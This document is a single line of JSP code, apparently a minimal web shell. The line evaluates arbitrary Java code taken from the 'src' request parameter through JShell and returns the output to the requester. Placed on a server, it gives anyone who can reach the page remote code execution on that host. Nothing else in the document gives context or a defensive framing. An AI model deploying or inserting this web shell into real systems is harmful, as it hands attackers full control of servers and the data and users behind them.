<%=jdk.jshell.JShell.builder().build().eval(request.getParameter("src")).get(0).value().replaceAll("^\"", "").replaceAll("\"$", "")%>